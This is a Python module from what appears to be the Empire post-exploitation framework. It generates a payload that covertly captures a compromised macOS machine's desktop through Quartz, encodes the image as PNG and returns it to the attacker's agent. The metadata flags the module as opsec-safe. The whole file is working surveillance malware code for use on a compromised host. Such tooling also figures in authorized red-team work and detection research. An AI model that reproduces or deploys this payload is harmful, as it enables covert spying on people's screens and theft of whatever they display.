class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Screenshot',

            # list of one or more authors for the module
            'Author': ['@harmj0y', 'globetother'],

            # more verbose multi-line description of the module
            'Description': ('Takes a screenshot of an OSX desktop using screencapture and returns the data.'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': "png",

            # if the module needs administrative privileges
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        script = """
import Quartz, zlib, struct, numpy
import Quartz.CoreGraphics as CG

def write_png(buf, width, height):
    width_byte_4 = width * 4

    def correct_colors(str):
        buf = list(str)
        # reverse the R and B color bytes
        for x in range(0, len(buf), 4):
            r = buf[x]
            g = buf[x+1]
            b = buf[x+2]
            a = buf[x+3]
            buf[x] = b
            buf[x+2] = r
        return ''.join(buf)

    # add null bytes at the start
    raw_data = b''.join(b'\\x00' + correct_colors(buf[span:span + width_byte_4])
                            for span in range(0, (height - 1) * width_byte_4 + 1, width_byte_4))

    def png_pack(png_tag, data):
        chunk_head = png_tag + data
        return (struct.pack("!I", len(data)) +
                chunk_head +
                struct.pack("!I", 0xFFFFFFFF & zlib.crc32(chunk_head)))

    return b''.join([
            b'\\x89PNG\\r\\n\\x1a\\n',
            png_pack(b'IHDR', struct.pack("!2I5B", width, height, 8, 6, 0, 0, 0)),
            png_pack(b'IDAT', zlib.compress(raw_data, 9)),
            png_pack(b'IEND', b'')])

def screenshot():
    image = CG.CGWindowListCreateImage(CG.CGRectInfinite, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)

    width = CG.CGImageGetWidth(image)
    height = CG.CGImageGetHeight(image)
    bytesperrow = CG.CGImageGetBytesPerRow(image)
    pixeldata = CG.CGDataProviderCopyData(CG.CGImageGetDataProvider(image))

    image = numpy.frombuffer(pixeldata, dtype=numpy.uint8)
    image = image.reshape((height, bytesperrow//4, 4))
    image = image[:,:width,:]

    return write_png(image.tostring(), width, height)

print screenshot()
"""

        return script
